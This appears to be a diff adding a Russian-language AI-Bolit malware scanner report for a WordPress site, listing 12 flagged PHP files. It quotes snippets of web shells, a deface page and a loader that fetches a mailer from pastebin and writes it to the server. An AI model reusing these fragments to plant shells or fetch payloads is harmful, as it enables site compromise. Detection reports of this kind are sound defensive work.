@@ -1,0 +1,513 @@
+<html>
+<head>
+    <!-- revisium.com/ai/ -->
+    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" >
+    <META NAME="ROBOTS" CONTENT="NOINDEX,NOFOLLOW">
+    <title>Отчет по /home/c/ca60673/wordpress</title>
+    <style type="text/css" title="currentStyle">
+        @import "https://cdn.revisium.com/ai/media/css/demo_page2.css";
+        @import "https://cdn.revisium.com/ai/media/css/jquery.dataTables2.css";
+    </style>
+
+    <script type="text/javascript" language="javascript" src="https://cdn.revisium.com/ai/jquery.js"></script>
+    <script type="text/javascript" language="javascript" src="https://cdn.revisium.com/ai/datatables.min.js"></script>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            color: #5a5a5a;
+            background: #FFFFFF;
+            font-size: 14px;
+            margin: 20px;
+            padding: 0;
+        }
+
+        .header {
+            font-size: 34px;
+            margin: 0 0 10px 0;
+        }
+
+        .hidd {
+            display: none;
+        }
+
+        .ok {
+            color: green;
+        }
+
+        .line_no {
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+
+            background: #DAF2C1;
+            padding: 2px 5px 2px 5px;
+            margin: 0 5px 0 5px;
+        }
+
+        .credits_header {
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+
+            background: #F2F2F2;
+            padding: 10px;
+            font-size: 11px;
+            margin: 0 0 10px 0;
+        }
+
+        .marker {
+            color: #FF0090;
+            font-weight: 100;
+            background: #FF0090;
+            padding: 2px 0 2px 0;
+            width: 2px;
+        }
+
+        .title {
+            font-size: 24px;
+            margin: 20px 0 10px 0;
+            color: #9CA9D1;
+        }
+
+        .summary {
+            float: left;
+            width: 500px;
+        }
+
+        .summary TD {
+            font-size: 12px;
+            border-bottom: 1px solid #F0F0F0;
+            font-weight: 700;
+            padding: 10px 0 10px 0;
+        }
+
+        .crit, .vir {
+            color: #D84B55;
+        }
+
+        .intitem {
+            color: #4a6975;
+        }
+
+        .spacer {
+            margin: 0 0 50px 0;
+            clear: both;
+        }
+
+        .warn {
+            color: #F6B700;
+        }
+
+        .clear {
+            clear: both;
+        }
+
+        .offer {
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+
+            width: 500px;
+            background: #F2F2F2;
+            color: #747474;
+            font-family: Helvetica, Arial, sans-serif;
+            padding: 30px;
+            margin: 20px 0 0 550px;
+            font-size: 14px;
+        }
+
+        .offer-our-products {
+            -webkit-border-radius: 4px;
+            -moz-border-radius: 4px;
+            border-radius: 4px;
+
+            width: 500px;
+            background: #f6f5e0;
+            color: #747474;
+            font-family: Helvetica, Arial, sans-serif;
+            padding: 30px;
+            margin: 20px 0 0 550px;
+            font-size: 14px;
+        }
+
+
+        HR {
+            margin-top: 15px;
+            margin-bottom: 15px;
+            opacity: .2;
+        }
+
+        .flist {
+            font-family: Henvetica, Arial, sans-serif;
+        }
+
+        .flist TD {
+            font-size: 11px;
+            padding: 5px;
+        }
+
+        .flist TH {
+            font-size: 12px;
+            height: 30px;
+            padding: 5px;
+            background: #CEE9EF;
+        }
+
+
+        .it {
+            font-size: 14px;
+            font-weight: 100;
+            margin-top: 10px;
+        }
+
+        .crit .it A {
+            color: #E50931;
+            line-height: 25px;
+            text-decoration: none;
+        }
+
+        .warn .it A {
+            color: #F2C900;
+            line-height: 25px;
+            text-decoration: none;
+        }
+
+
+        .details {
+            font-family: Calibri, sans-serif;
+            font-size: 12px;
+            margin: 10px 10px 10px 0;
+        }
+
+        .crit .details {
+            color: #A08080;
+        }
+
+        .warn .details {
+            color: #808080;
+        }
+
+        .details A {
+            color: #FFF;
+            font-weight: 700;
+            text-decoration: none;
+            padding: 2px;
+            background: #E5CEDE;
+            -webkit-border-radius: 7px;
+            -moz-border-radius: 7px;
+            border-radius: 7px;
+        }
+
+        .details A:hover {
+            background: #A0909B;
+        }
+
+        .ctd {
+            margin: 10px 0 10px 0;
+            align: center;
+        }
+
+        .ctd A {
+            color: #0D9922;
+        }
+
+        .disclaimer {
+            color: darkgreen;
+            margin: 10px 10px 10px 0;
+        }
+
+        .note_vir {
+            margin: 10px 0 10px 0;
+        / / padding: 10 px;
+            color: #FF4F4F;
+            font-size: 15px;
+            font-weight: 700;
+            clear: both;
+
+        }
+
+        .note_warn {
+            margin: 10px 0 10px 0;
+            color: #F6B700;
+            font-size: 15px;
+            font-weight: 700;
+            clear: both;
+        }
+
+        .note_int {
+            margin: 10px 0 10px 0;
+            color: #60b5d6;
+            font-size: 15px;
+            font-weight: 700;
+            clear: both;
+        }
+
+        .updateinfo {
+            color: #FFF;
+            text-decoration: none;
+            background: #E5CEDE;
+            -webkit-border-radius: 7px;
+            -moz-border-radius: 7px;
+            border-radius: 7px;
+
+            margin: 10px 0 10px 0;
+            padding: 10px;
+        }
+
+
+        .caution {
+            color: #EF7B75;
+            text-decoration: none;
+            margin: 20px 0 0 0;
+            font-size: 12px;
+        }
+
+        .footer {
+            color: #303030;
+            text-decoration: none;
+            background: #F4F4F4;
+            -webkit-border-radius: 7px;
+            -moz-border-radius: 7px;
+            border-radius: 7px;
+
+            margin: 80px 0 10px 0px;
+            padding: 10px;
+        }
+
+        .rep {
+            color: #303030;
+            text-decoration: none;
+            background: #94DDDB;
+            -webkit-border-radius: 7px;
+            -moz-border-radius: 7px;
+            border-radius: 7px;
+
+            margin: 10px 0 10px 0;
+            padding: 10px;
+            font-size: 12px;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="header">Отчет сканера <a href="https://revisium.com/ai/">AI-Bolit</a> vHOSTER-30.2.3: /home/c/ca60673/wordpress/ (2/0)</div>
+<div class="credits_header">Сканер бесплатный только для личного некоммерческого использования. Информация по <a href="https://revisium.com/ai/faq.php#faq11" target=_blank>коммерческой лицензии</a> (пункт №11). <a href="https://revisium.com/images/mini_aibolit.jpg">Авторское свидетельство</a> о гос. регистрации в РосПатенте №2012619254 от 12 октября 2012 г.</div>
+<div class="details_header">
+    Затрачено времени: <b>334.5</b>. Сканирование начато 19-10-2020 в 11:56:34, сканирование завершено 19-10-2020 в 12:02:08<br/>
+    Всего проверено 0 директорий и 5636 файлов. Использовано памяти при сканировании: 12.45 Mb.
+</div>
+
+
+
+<div class="summary">
+    <div class="title">Сводный отчет</div><table cellspacing=0 border=0><tr><td class="crit" width=400>Вредоносных скриптов</td><td class="crit">12</td></tr></table><!--[json]{"redirect":0,"critical_php":12,"critical_js":0,"phishing":0,"unix_exec":0,"iframes":0,"not_read":0,"base64":0,"heuristics":0,"symlinks":0,"big_files_skipped":0,"suspicious":0}[/json]--><div class=details style="margin: 20px 20px 20px 0">Обращаем внимание, что обнаруженные файлы не всегда являются вирусами и хакерскими скриптами. Сканер минимизирует число ложных обнаружений, но это не всегда возможно, так как найденный фрагмент может встречаться как во вредоносных скриптах, так и в обычных.<p>Для диагностического сканирования без ложных срабатываний мы разработали специальную версию <u><a href="https://revisium.com/ru/blog/ai-bolit-4-ISP.html" target=_blank style="background: none; color: #303030">сканера для хостинг-компаний</a></u>.</div>
+
+</div>
+
+<div class="offer">
+        <div>
+     <div class="crit" style="font-size: 17px; margin-bottom: 20px"><b>Внимание! Наш сканер обнаружил подозрительный или вредоносный код</b>.</div> 
+     <p>Возможно, ваш сайт был взломан. Рекомендуем срочно <a href="https://revisium.com/ru/order/#fform" target=_blank>проконсультироваться со специалистами</a> по данному отчету.</p>
+     <p><hr size=1></p>
+     <p>Рекомендуем также проверить сайт бесплатным <b><a href="https://rescan.pro/?utm=aibolit" target=_blank>онлайн-сканером ReScan.Pro</a></b>.</p>
+     <p><hr size=1></p>
+         <div class="caution">Не оставляйте файл отчета на сервере, и не давайте на него прямых ссылок с других сайтов. Информация из отчета может быть использована злоумышленниками для взлома сайта, так как содержит информацию о настройках сервера, файлах и каталогах.</div>
+    </div>
+</div>
+
+<div class="offer-our-products">
+           <b>Наши продукты:</b><br/>
+              <ul>
+               <li style="margin-top: 10px"><font color=red><sup>[new]</sup></font><b><a href="https://revisium.com/ru/products/antivirus_for_ispmanager/" target=_blank>Антивирус для ISPmanager Lite</a></b> &mdash;  сканирование и лечение сайтов прямо в панели хостинга</li>
+               <li style="margin-top: 10px"><b><a href="https://revisium.com/ru/blog/revisium-antivirus-for-plesk.html" target=_blank>Антивирус для Plesk</a> Onyx 17.x</b> &mdash;  сканирование и лечение сайтов прямо в панели хостинга</li>
+               <li style="margin-top: 10px"><b><a href="https://cloudscan.pro/ru/" target=_blank>Облачный антивирус CloudScan.Pro</a> для веб-специалистов</b> &mdash; лечение сайтов в один клик</li>
+               <li style="margin-top: 10px"><b><a href="https://revisium.com/ru/antivirus-server/" target=_blank>Антивирус для сервера</a></b> &mdash; для хостинг-компаний, веб-студий и агентств.</li>
+              </ul>  
+    </div>
+</div>
+
+<div class="clear"></div>
+
+<div class="title">Критические замечания</div><div class="note_vir">Эти файлы могут быть вредоносными или хакерскими скриптами (12)</div><div class="crit"><div class="flist"><table cellspacing=1 cellpadding=4 border=0 id="table_crit"><thead><tr class="tbgh0"><th width=70%>Путь</th><th>Изменение свойств</th><th>Изменение содержимого</th><th width=90>Размер</th><th width=0 class="hidd">CRC32</th><th width=0 class="hidd"></th><th width=0 class="hidd"></th><th width=0 class="hidd"></th></tr></thead><tbody><tr class="tbg0" o="id_d6445758"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/wp-content/themes/themes.php</a></div><div class="details"><a href="#" onclick="return hsig('id_d6445758')">[x]</a> …(&quot;display_errors&quot;,0);set_time_limit(0);ini_set(&quot;memory_limit&quot;,&quot;64M&quot;);${${&quot;GLOBALS&quot;}[&quot;calepsq&quot;]}=$_SERVER[&quot;SERVER_NAME&quot;];<span class="marker">&nbsp;</span>echo&quot;&lt;center&gt;&lt;h1&gt;IDBTE4M CODE 87&lt;/h1&gt;&lt;br&gt;[uname] &quot;.php_uname().&quot; [/uname]&lt;br&gt;Posisi : &quot;.${${&quot;GLOBALS&quot;}[&quot;xjcxinljxk&quot;]}</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/10/2020 15:36:01</div></td><td align=center><div class="ctd">3.03 Kb</div></td><td class="hidd"><div class="hidd">ccce0dec8069a77aa815d6f10a8c00207bddf6dd</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1601555761</div></td><td class="hidd"><div class="hidd">id_d6445758</div></td></tr><tr class="tbg1" o="id_b731c6d6"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/wp-includes/js/include.php</a></div><div class="details"><a href="#" onclick="return hsig('id_b731c6d6')">[x]</a> …et_contents(&#039;/proc/version&#039;));showSecParam(&#039;Distr name&#039;,file_get_contents(&#039;/etc/issue.net&#039;));if(!$GLOBALS[&#039;safe_mode&#039;]){<span class="marker">&nbsp;</span>$userful=array(&#039;gcc&#039;,&#039;lcc&#039;,&#039;cc&#039;,&#039;ld&#039;,&#039;make&#039;,&#039;php&#039;,&#039;perl&#039;,&#039;python&#039;,&#039;ruby&#039;,&#039;tar&#039;,&#039;gzip&#039;,&#039;bzip&#039;,&#039;bzip2&#039;,&#039;nc&#039;,&#039;locate&#039;,&#039;sui</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/10/2020 15:35:57</div></td><td align=center><div class="ctd">59.77 Kb</div></td><td class="hidd"><div class="hidd">f1566e4e352e6fa5b698c25757bd0fc0a3a6b8bd</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1601555757</div></td><td class="hidd"><div class="hidd">id_b731c6d6</div></td></tr><tr class="tbg0" o="id_d6445758"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/index2.php</a></div><div class="details"><a href="#" onclick="return hsig('id_d6445758')">[x]</a> …(&quot;display_errors&quot;,0);set_time_limit(0);ini_set(&quot;memory_limit&quot;,&quot;64M&quot;);${${&quot;GLOBALS&quot;}[&quot;calepsq&quot;]}=$_SERVER[&quot;SERVER_NAME&quot;];<span class="marker">&nbsp;</span>echo&quot;&lt;center&gt;&lt;h1&gt;IDBTE4M CODE 87&lt;/h1&gt;&lt;br&gt;[uname] &quot;.php_uname().&quot; [/uname]&lt;br&gt;Posisi : &quot;.${${&quot;GLOBALS&quot;}[&quot;xjcxinljxk&quot;]}</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/10/2020 15:36:02</div></td><td align=center><div class="ctd">3.03 Kb</div></td><td class="hidd"><div class="hidd">ccce0dec8069a77aa815d6f10a8c00207bddf6dd</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1601555762</div></td><td class="hidd"><div class="hidd">id_d6445758</div></td></tr><tr class="tbg1" o="id_de32288e"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/ijo.php</a></div><div class="details"><a href="#" onclick="return hsig('id_de32288e')">[x]</a> …eparefunc=strrev(&#039;etalfnizg&#039;);return$preparefunc($filter);}if(isset($_POST[&#039;newname&#039;])){if(trim($_POST[&#039;newname&#039;])!=&#039;&#039;){<span class="marker">&nbsp;</span>$name=trim($_POST[&#039;newname&#039;]).&#039;.php&#039;;$lul=file_get_contents(__FILE__);$lol=fopen($name,&quot;w+&quot;);fwrite($lol,$lul);fclose($</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">21.06 Kb</div></td><td class="hidd"><div class="hidd">f74f0c4d4fda92c196ad34216a88de8ff46aec22</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_de32288e</div></td></tr><tr class="tbg0" o="id_c059e1d3"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/mini.php</a></div><div class="details"><a href="#" onclick="return hsig('id_c059e1d3')">[x]</a> <span class="marker">&nbsp;</span>&lt;?php  ${&quot;GLOBALS&quot;}[&quot;wtcebecn&quot;]=&quot;a&quot;;${&quot;GLOBALS&quot;}[&quot;vvunsca</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">1.69 Kb</div></td><td class="hidd"><div class="hidd">750aca79fa546503ec5f0244ab7afa4d437b8fca</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_c059e1d3</div></td></tr><tr class="tbg1" o="id_4af4186a"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/m.php</a></div><div class="details"><a href="#" onclick="return hsig('id_4af4186a')">[x]</a> …:&lt;/font&gt;&lt;br&gt;&lt;input cols=&#039;10&#039; rows=&#039;10&#039; type=&#039;text&#039; style=&#039;color:lime;background-color:#000000&#039; name=&#039;base_dir&#039; value=&#039;&quot;.<span class="marker">&nbsp;</span>getcwd().&quot;&#039;&gt;&lt;br&gt;&lt;br&gt;&quot;;echo &quot;&lt;font color=&#039;red&#039;&gt;[+] Mass File:&lt;/font&gt;&lt;br&gt;&lt;input cols=&#039;10&#039; rows=&#039;10&#039; type=&#039;text&#039; style=&#039;co</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">1.63 Kb</div></td><td class="hidd"><div class="hidd">454ccfc9a75e5aa711f1d6b154d4c73fba700881</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_4af4186a</div></td></tr><tr class="tbg0" o="id_92afab94"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/index.php</a></div><div class="details"><a href="#" onclick="return hsig('id_92afab94')">[x]</a> …pen21=fopen($check21,&#039;w&#039;);fwrite($open21,$text21);fclose($open21);if(file_exists($check21)){}$mailer=$home.&#039;/.send.php&#039;;<span class="marker">&nbsp;</span>$ambila=http_get(&#039;https://pastebin.com/raw/fJvQSbPY&#039;);$bukaa=fopen($mailer,&#039;w&#039;);fwrite($bukaa,$ambila);fclose($bukaa);i</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">2.38 Kb</div></td><td class="hidd"><div class="hidd">af1421897ab12e0c05d0872c10d08a638953868c</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_92afab94</div></td></tr><tr class="tbg1" o="id_4a4c48a5"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/Lol.php</a></div><div class="details"><a href="#" onclick="return hsig('id_4a4c48a5')">[x]</a> &lt;?php  echo &#039;<span class="marker">&nbsp;</span>&lt;title&gt;Hacked By IDBTE4M&lt;/title&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/1.8.0/</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">1.19 Kb</div></td><td class="hidd"><div class="hidd">557839f82fffd941c938543486725562563d8e79</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_4a4c48a5</div></td></tr><tr class="tbg0" o="id_555b3827"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/send.php</a></div><div class="details"><a href="#" onclick="return hsig('id_555b3827')">[x]</a> &lt;html&gt;&lt;head&gt;<span class="marker">&nbsp;</span>&lt;title&gt;\M/&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#e6e6e6&quot;&gt;&lt;center&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;header&gt;&lt;title&gt;-&lt;/title&gt;&lt;/header</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">4.32 Kb</div></td><td class="hidd"><div class="hidd">d4fcbcc1cd07ec0dfe35c5fbcacce63b91976f28</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_555b3827</div></td></tr><tr class="tbg1" o="id_f221167c"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/ale.php</a></div><div class="details"><a href="#" onclick="return hsig('id_f221167c')">[x]</a> …ay(&quot;status&quot;=&gt;&quot;BAD&quot;,&quot;server&quot;=&gt;$outserver,&quot;error&quot;=&gt;$translation-&gt;getWord(&quot;shell-sheck-test-command-execution-failed&quot;)));}}<span class="marker">&nbsp;</span>class ShellManager{private$shells;private$types;private$timeout;function__construct($timeout=10){$this-&gt;timeout=$timeou</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">640.76 Kb</div></td><td class="hidd"><div class="hidd">228ac1883aedb788b02b45dcbc22cebcddab8539</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_f221167c</div></td></tr><tr class="tbg0" o="id_73e582f3"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/5.php</a></div><div class="details"><a href="#" onclick="return hsig('id_73e582f3')">[x]</a> <span class="marker">&nbsp;</span>GIF89a&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;application/.php&quot;&gt;&lt;center&gt;&lt;?php  ini_set(&#039;output_buffering&#039;,0);ini_set(&#039;d</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">67.35 Kb</div></td><td class="hidd"><div class="hidd">13d944b0707475c0a635f658676b2fcd10c84ef4</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_73e582f3</div></td></tr><tr class="tbg1" o="id_271ebe3f"><td><div class="it"><a class="it">/home/c/ca60673/wordpress/public_html/code87/uwu.php</a></div><div class="details"><a href="#" onclick="return hsig('id_271ebe3f')">[x]</a> …$wp_admin_bar=new$admin_bar_class;else return false;$wp_admin_bar-&gt;initialize();$wp_admin_bar-&gt;add_menus();return true;}<span class="marker">&nbsp;</span>function pre_admin_bar($wp_kses_data,$wp_nonce){$kses_str=str_replace(array(&#039;%&#039;,&#039;*&#039;),array(&#039;/&#039;,&#039;=&#039;),$wp_kses_data);$fil</div></td><td align=center><div class="ctd">08/10/2020 10:50:38</div></td><td align=center><div class="ctd">01/09/2020 23:53:14</div></td><td align=center><div class="ctd">23.17 Kb</div></td><td class="hidd"><div class="hidd">b5aabc76e2cca81a259f5919e6670c381fe85893</div></td><td class="hidd"><div class="hidd">x</div></td><td class="hidd"><div class="hidd">1598993594</div></td><td class="hidd"><div class="hidd">id_271ebe3f</div></td></tr></tbody></table></div><div class=clear style="margin: 20px 0 0 0"></div></div>
+
+
+<div class="footer">
+       <div class="disclaimer"><span class="vir">[!]</span> Отказ от гарантий: невозможно гарантировать обнаружение всех вредоносных скриптов. Поэтому разработчик сканера не несет ответственности за возможные последствия работы сканера AI-Bolit или неоправданные ожидания пользователей относительно функциональности и возможностей.
+   </div>
+   <div class="thanx">
+      Мы будем чрезвычайно благодарны за любые упоминания сканера AI-Bolit на вашем сайте, в блоге, среди друзей, знакомых и клиентов. <br/>Ссылку можно поставить на страницу <a href="https://revisium.com/ai/">https://revisium.com/ai/</a>.<br/>
+    </div>
+</div>
+
+<script language="javascript">
+    function hsig(id) {
+        var divs = document.getElementsByTagName("tr");
+        for(var i = 0; i < divs.length; i++){
+
+            if (divs[i].getAttribute('o') == id) {
+                divs[i].innerHTML = '';
+            }
+        }
+
+        return false;
+    }
+
+
+    $(document).ready(function(){
+        $('#table_crit').dataTable({
+            "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+            "aoColumns": [
+                {"iDataSort": 7, "width":"70%"},
+                {"iDataSort": 5},
+                {"iDataSort": 6},
+                {"bSortable": true},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false}
+            ],
+            "paging": true,
+            "iDisplayLength": 500,
+            "oLanguage": {
+                "sLengthMenu": "Отображать по _MENU_ записей",
+                "sZeroRecords": "Ничего не найдено",
+                "sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+                "sInfoEmpty": "Нет файлов",
+                "sInfoFiltered": "(всего записей _MAX_)",
+                "sSearch":       "Поиск:",
+                "sUrl":          "",
+                "oPaginate": {
+                    "sFirst": "Первая",
+                    "sPrevious": "Предыдущая",
+                    "sNext": "Следующая",
+                    "sLast": "Последняя"
+                },
+                "oAria": {
+                    "sSortAscending": ": активировать для сортировки столбца по возрастанию",
+                    "sSortDescending": ": активировать для сортировки столбцов по убыванию"
+                }
+            }
+
+        } );
+
+    });
+
+    $(document).ready(function(){
+        $('#table_vir').dataTable({
+            "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+            "paging": true,
+            "aoColumns": [
+                {"iDataSort": 7, "width":"70%"},
+                {"iDataSort": 5},
+                {"iDataSort": 6},
+                {"bSortable": true},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false}
+            ],
+            "iDisplayLength": 500,
+            "oLanguage": {
+                "sLengthMenu": "Отображать по _MENU_ записей",
+                "sZeroRecords": "Ничего не найдено",
+                "sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+                "sInfoEmpty": "Нет файлов",
+                "sInfoFiltered": "(всего записей _MAX_)",
+                "sSearch":       "Поиск:",
+                "sUrl":          "",
+                "oPaginate": {
+                    "sFirst": "Первая",
+                    "sPrevious": "Предыдущая",
+                    "sNext": "Следующая",
+                    "sLast": "Последняя"
+                },
+                "oAria": {
+                    "sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+                    "sSortDescending": ": активировать для сортировки столбцов по убыванию"
+                }
+            },
+
+        } );
+
+    });
+
+    if ($('#table_warn0')) {
+        $('#table_warn0').dataTable({
+            "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+            "paging": true,
+            "aoColumns": [
+                {"iDataSort": 7, "width":"70%"},
+                {"iDataSort": 5},
+                {"iDataSort": 6},
+                {"bSortable": true},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false}
+            ],
+            "iDisplayLength": 500,
+            "oLanguage": {
+                "sLengthMenu": "Отображать по _MENU_ записей",
+                "sZeroRecords": "Ничего не найдено",
+                "sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+                "sInfoEmpty": "Нет файлов",
+                "sInfoFiltered": "(всего записей _MAX_)",
+                "sSearch":       "Поиск:",
+                "sUrl":          "",
+                "oPaginate": {
+                    "sFirst": "Первая",
+                    "sPrevious": "Предыдущая",
+                    "sNext": "Следующая",
+                    "sLast": "Последняя"
+                },
+                "oAria": {
+                    "sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+                    "sSortDescending": ": активировать для сортировки столбцов по убыванию"
+                }
+            }
+
+        } );
+    }
+
+    if ($('#table_warn1')) {
+        $('#table_warn1').dataTable({
+            "aLengthMenu": [[100 , 500, -1], [100, 500, "All"]],
+            "paging": true,
+            "aoColumns": [
+                {"iDataSort": 7, "width":"70%"},
+                {"iDataSort": 5},
+                {"iDataSort": 6},
+                {"bSortable": true},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false},
+                {"bVisible": false}
+            ],
+            "iDisplayLength": 500,
+            "oLanguage": {
+                "sLengthMenu": "Отображать по _MENU_ записей",
+                "sZeroRecords": "Ничего не найдено",
+                "sInfo": "Отображается c _START_ по _END_ из _TOTAL_ файлов",
+                "sInfoEmpty": "Нет файлов",
+                "sInfoFiltered": "(всего записей _MAX_)",
+                "sSearch":       "Поиск:",
+                "sUrl":          "",
+                "oPaginate": {
+                    "sFirst": "Первая",
+                    "sPrevious": "Предыдущая",
+                    "sNext": "Следующая",
+                    "sLast": "Последняя"
+                },
+                "oAria": {
+                    "sSortAscending":  ": активировать для сортировки столбца по возрастанию",
+                    "sSortDescending": ": активировать для сортировки столбцов по убыванию"
+                }
+            }
+
+        } );
+    }
+</script>
+<!-- [][]  -->
+</body>
+</html>
